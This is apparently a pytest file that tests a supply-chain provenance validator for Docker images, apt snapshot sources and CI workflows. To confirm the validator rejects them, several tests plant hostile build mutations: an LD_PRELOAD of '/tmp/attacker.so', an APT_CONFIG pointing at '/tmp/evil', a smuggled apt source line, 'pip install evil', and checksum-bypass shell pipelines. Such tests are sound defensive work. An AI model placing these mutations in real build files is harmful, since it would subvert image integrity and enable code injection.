def test_apt_snapshot_receipt_rejects_alternate_inputs(
    tmp_path: Path, mutation: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    source = dockerfile.read_text(encoding="utf-8")
    if mutation == "ansi-newline":
        source = source.replace(
            "'deb https://snapshot.debian.org/archive/debian/20240101T000000Z bookworm main'",
            "'deb https://snapshot.debian.org/archive/debian/20240101T000000Z bookworm main'$'\\n''deb http://deb.debian.org/debian bookworm main'",
            1,
        )
    elif mutation == "stale-lists":
        source = source.replace(
            "rm -rf /etc/apt/sources.list.d /var/lib/apt/lists/*",
            "rm -rf /etc/apt/sources.list.d",
            1,
        )
    elif mutation == "missing-source-options":
        source = source.replace(APT_COMMAND, "apt-get", 2)
    elif mutation == "alternate-lists":
        source = source.replace(
            "Dir::State::lists=/var/lib/apt/lists",
            "Dir::State::lists=/tmp/attacker-lists",
            1,
        )
    elif mutation == "apt-config-env":
        source = source.replace(
            "USER root\n", "USER root\nENV APT_CONFIG=/tmp/evil\n", 1
        )
    else:
        source = source.replace(
            SNAPSHOT_RELEASE_URL,
            "https://snapshot.debian.org/archive/debian/20240101T000000Z/pool/unrelated.deb",
            1,
        )
    _write(dockerfile, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert discovery.records["apt_snapshots"] == []
    assert any(
        issue["category"] == "apt_snapshot_mutable" for issue in discovery.issues
    )


@pytest.mark.parametrize("mutation", ["pipeline", "commented-checksum"])
def test_download_receipt_rejects_noncanonical_shell_grammar(
    tmp_path: Path, mutation: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    if mutation == "pipeline":
        replacement = (
            f"RUN curl -fsSL {SNAPSHOT_RELEASE_URL} -o /tmp/Release | "
            f'echo "{SHA_B}  /tmp/Release" | sha256sum -c - | '
            'test 1 -eq 1 -o "$(stat -c %s /tmp/Release)" -eq 1234'
        )
    else:
        replacement = (
            f"RUN curl -fsSL {SNAPSHOT_RELEASE_URL} -o /tmp/Release && "
            "echo -e 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  /dev/null\\n"
            f"# {SHA_B}  /tmp/Release' | sha256sum -c - && "
            'test "$(stat -c %s /tmp/Release)" -eq 1234'
        )
    _write(
        dockerfile,
        dockerfile.read_text(encoding="utf-8").replace(DOWNLOAD_RUN, replacement, 1),
    )

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(
        issue["category"] == "download_artifact_unverified"
        and "Release" in issue["input"]
        for issue in discovery.issues
    )


def test_dockerfile_parser_directive_is_rejected(tmp_path: Path) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    dockerfile = root / "docker/images/airflow/Dockerfile"
    _write(
        dockerfile,
        "# escape=`\n" + dockerfile.read_text(encoding="utf-8"),
    )

    with pytest.raises(provenance.ProvenanceError, match="parser directive"):
        provenance.discover_repository(root)


@pytest.mark.parametrize(
    "mutation",
    [
        "quoted-uses",
        "flow-uses",
        "inline-steps",
        "local-action",
        "folded-run",
        "quoted-run",
    ],
)
def test_workflow_rejects_yaml_forms_outside_scanner_subset(
    tmp_path: Path, mutation: str
) -> None:
    root, _, _, _ = _ready_repository(tmp_path)
    workflow = root / ".github/workflows/whoscored-ci.yml"
    source = workflow.read_text(encoding="utf-8")
    if mutation == "quoted-uses":
        source = source.replace(
            f"uses: actions/checkout@{COMMIT}", '"uses": actions/checkout@v4', 1
        )
        expected = "github_action_unpinned"
    elif mutation == "flow-uses":
        source = source.replace(
            f"- uses: actions/checkout@{COMMIT}",
            "- {uses: actions/checkout@v4}",
            1,
        )
        expected = "github_action_unpinned"
    elif mutation == "inline-steps":
        source = source.replace(
            f"steps:\n      - uses: actions/checkout@{COMMIT}",
            "steps: [{uses: actions/checkout@v4}]",
            1,
        )
        expected = "github_action_unpinned"
    elif mutation == "local-action":
        source = source.replace(f"actions/checkout@{COMMIT}", "./unmeasured-action", 1)
        expected = "github_action_unpinned"
    elif mutation == "quoted-run":
        source = source.replace(
            "run: python -m pip install --require-hashes --only-binary=:all: -r ci.lock",
            'run: "pip install evil"',
            1,
        )
        expected = "ci_floating_install"
    else:
        source = source.replace(
            "run: python -m pip install --require-hashes --only-binary=:all: -r ci.lock",
            "run: >-\n        python -m pip\n        install evil",
            1,
        )
        expected = "ci_floating_install"
    _write(workflow, source)

    discovery = provenance.discover_repository(
        root, payload_image_ids={"scheduler": f"sha256:{SHA_B}"}
    )

    assert any(issue["category"] == expected for issue in discovery.issues)


@pytest.mark.parametrize(
    ("service", "path", "stage", "needle", "replacement"),
    [
        (
            "airflow-scheduler",
            ROOT / "docker/images/airflow/Dockerfile",
            "airflow-scheduler",
            '/entrypoint"]',
            '/bin/sh"]',
        ),
        (
            "whoscored_paid_gateway",
            ROOT / "docker/images/airflow/Dockerfile",
            "airflow-whoscored-proxy",
            '/entrypoint"]',
            '/bin/sh"]',
        ),
        (
            "whoscored_proxy_filter",
            ROOT / "docker/images/airflow/Dockerfile",
            "airflow-whoscored-proxy",
            '/entrypoint"]',
            '/bin/sh"]',
        ),
        (
            "flaresolverr_whoscored_paid",
            ROOT / "docker/images/flaresolverr-whoscored/Dockerfile",
            "stage-1",
            'whoscored-flaresolverr-entrypoint"]',
            '/bin/sh"]',
        ),
        (
            "flaresolverr",
            ROOT / "docker/images/flaresolverr-whoscored/Dockerfile",
            "stage-1",
            'whoscored-flaresolverr-entrypoint"]',
            '/bin/sh"]',
        ),
    ],
)
def test_protected_stage_recipe_pins_baked_entrypoint_and_cmd(
    service: str, path: Path, stage: str, needle: str, replacement: str
) -> None:
    expected = provenance.PROTECTED_SERVICE_BUILDS[service]
    config = provenance.BuildConfig(
        service=service,
        context=expected[0],
        dockerfile=expected[1],
        target=expected[2],
        image=expected[3],
    )
    context = (ROOT / expected[0]).resolve()
    discovery = provenance._empty_discovery(ROOT, COMMIT)
    _, context_inputs = provenance._context_digest(context, path, discovery)
    closure = provenance._scan_dockerfile(
        path,
        context,
        context_inputs,
        discovery,
        selected_targets={config.target},
    )
    provenance._validate_protected_stage_recipe(config, closure)
    instructions = closure.instructions_by_stage[stage]
    closure.instructions_by_stage[stage] = [
        line.replace(needle, replacement) for line in instructions
    ]

    with pytest.raises(provenance.ProvenanceError, match="final stage recipe"):
        provenance._validate_protected_stage_recipe(config, closure)


def test_protected_recipe_pins_reachable_parent_environment() -> None:
    service = "airflow-scheduler"
    expected = provenance.PROTECTED_SERVICE_BUILDS[service]
    config = provenance.BuildConfig(
        service=service,
        context=expected[0],
        dockerfile=expected[1],
        target=expected[2],
        image=expected[3],
    )
    path = ROOT / expected[1]
    context = ROOT / expected[0]
    discovery = provenance._empty_discovery(ROOT, COMMIT)
    _, context_inputs = provenance._context_digest(context, path, discovery)
    closure = provenance._scan_dockerfile(
        path,
        context,
        context_inputs,
        discovery,
        selected_targets={config.target},
    )
    closure.instructions_by_stage["airflow-base"].append(
        "ENV LD_PRELOAD=/tmp/attacker.so"
    )

    with pytest.raises(provenance.ProvenanceError, match="final stage recipe"):
        provenance._validate_protected_stage_recipe(config, closure)


def test_external_deployment_result_reuses_exact_fd_pinned_bytes(
    tmp_path: Path,
) -> None:
    root, manifest_path, deployment_path, _ = _ready_repository(tmp_path)
    attestation_path = root / provenance.ATTESTATION_RELATIVE

    discovery = provenance.validate(
        root,
        attestation_path=attestation_path,
        manifest_path=manifest_path,
        deployment_attestation_path=deployment_path,
        expect_blocked=False,
    )

    assert discovery.build_attestation_raw == attestation_path.read_bytes()
    assert discovery.build_attestation_identity == provenance._stat_identity(
        attestation_path.stat()
    )
    assert discovery.build_manifest_raw == manifest_path.read_bytes()
    assert discovery.build_manifest_identity == provenance._stat_identity(
        manifest_path.stat()
    )
    assert discovery.deployment_attestation_raw == deployment_path.read_bytes()
    assert discovery.deployment_attestation_identity == provenance._stat_identity(
        deployment_path.stat()
    )
    assert discovery.deployment_final_images == {
        "scheduler": f"registry.example/whoscored@sha256:{SHA_C}"
    }
    assert discovery.validated_release_revision == _git(root, "rev-parse", "HEAD")
    assert discovery.validated_payload_revision == discovery.revision
    assert (
        discovery.validated_manifest_sha256
        == hashlib.sha256(manifest_path.read_bytes()).hexdigest()
    )
    assert (
        discovery.validated_source_tree_sha256 == discovery.report["source_tree_sha256"]
    )
    assert discovery.validated_payload_image_ids == {"scheduler": f"sha256:{SHA_B}"}
    with pytest.raises(TypeError):
        assert discovery.deployment_final_images is not None
        discovery.deployment_final_images["scheduler"] = "mutable"  # type: ignore[index]
    with pytest.raises(TypeError):
        assert discovery.validated_payload_image_ids is not None
        discovery.validated_payload_image_ids["scheduler"] = "mutable"  # type: ignore[index]


@pytest.mark.parametrize("unsafe", ["symlink", "hardlink", "writable-parent"])
def test_external_deployment_path_must_be_fd_pinned_and_protected(
    tmp_path: Path, unsafe: str
) -> None:
    root, manifest_path, deployment_path, _ = _ready_repository(tmp_path)
    selected = tmp_path / "selected-deployment.json"
    if unsafe == "symlink":
        selected.symlink_to(deployment_path)
    elif unsafe == "hardlink":
        selected.hardlink_to(deployment_path)
    else:
        parent = tmp_path / "unsafe-parent"
        parent.mkdir(mode=0o777)
        parent.chmod(0o777)
        selected = parent / "deployment.json"
        _write(selected, deployment_path.read_bytes())

    with pytest.raises(provenance.ProvenanceError, match="protected|unreadable|unsafe"):
        provenance.validate(
            root,
            attestation_path=root / provenance.ATTESTATION_RELATIVE,
            manifest_path=manifest_path,
            deployment_attestation_path=selected,
            expect_blocked=False,
        )


def _flaresolverr_context(tmp_path: Path) -> tuple[Path, Path]:
    root = tmp_path / "flaresolverr-context"
    dockerfile = root / provenance.FLARESOLVERR_DOCKERFILE
    _write(root / ".dockerignore", provenance.FLARESOLVERR_CONTEXT_RULES)
    _write(
        dockerfile.with_name("Dockerfile.dockerignore"),
        provenance.FLARESOLVERR_CONTEXT_RULES,
    )
    _write(dockerfile, f"FROM example.invalid/base@sha256:{SHA_A}\n")
    _write(
        root / "docker/images/flaresolverr-whoscored/entrypoint.sh",
        "#!/bin/sh\nexec true\n",
    )
    _write(root / "scripts/flaresolverr_extended.py", "print('extension')\n")
    return root, dockerfile


def _flaresolverr_digest(root: Path, dockerfile: Path) -> tuple[str, set[str]]:
    discovery = provenance.Discovery(root=root, revision=COMMIT)
    return provenance._context_digest(root, dockerfile, discovery)


def test_flaresolverr_context_hashes_exact_five_file_allowlist(tmp_path: Path) -> None:
    root, dockerfile = _flaresolverr_context(tmp_path)
    baseline, inputs = _flaresolverr_digest(root, dockerfile)
    assert inputs == provenance.FLARESOLVERR_CONTEXT_FILES

    _write(root / ".env", "SECRET=must-not-be-sent\n")
    _write(root / "raw/private-session.json", "{}\n")
    ignored_noise, _ = _flaresolverr_digest(root, dockerfile)
    assert ignored_noise == baseline

    semantic_inputs = (
        dockerfile,
        root / "docker/images/flaresolverr-whoscored/entrypoint.sh",
        root / "scripts/flaresolverr_extended.py",
    )
    for index, path in enumerate(semantic_inputs, 1):
        original = path.read_bytes()
        _write(path, original + f"# semantic-{index}\n".encode())
        changed, _ = _flaresolverr_digest(root, dockerfile)
        assert changed != baseline
        _write(path, original)


def test_flaresolverr_context_rejects_divergent_ignore_controls(tmp_path: Path) -> None:
    root, dockerfile = _flaresolverr_context(tmp_path)
    _write(root / ".dockerignore", provenance.FLARESOLVERR_CONTEXT_RULES + "!.env\n")

    with pytest.raises(provenance.ProvenanceError, match="canonical policy"):
        _flaresolverr_digest(root, dockerfile)


def test_ready_promotion_rejects_dirty_or_untracked_material(tmp_path: Path) -> None:
    root, manifest_path, deployment_path, _ = _ready_repository(tmp_path)
    _write(root / "ci.lock", f"ruff==9.9.9 --hash=sha256:{SHA_C}\n")

    with pytest.raises(provenance.ProvenanceError, match="clean working tree"):
        provenance.validate(
            root,
            attestation_path=root / provenance.ATTESTATION_RELATIVE,
            manifest_path=manifest_path,
            deployment_attestation_path=deployment_path,
            expect_blocked=False,
        )


def test_deployment_attestation_requires_named_registry_digest(tmp_path: Path) -> None:
    root, manifest_path, deployment_path, _ = _ready_repository(tmp_path)
    deployment = json.loads(deployment_path.read_text(encoding="utf-8"))
    deployment["images"][0]["final_image"] = f"sha256:{SHA_C}"
    _canonical(deployment_path, deployment)

    with pytest.raises(provenance.ProvenanceError, match="canonical and immutable"):
        provenance.validate(
            root,
            attestation_path=root / provenance.ATTESTATION_RELATIVE,
            manifest_path=manifest_path,
            deployment_attestation_path=deployment_path,
            expect_blocked=False,
        )
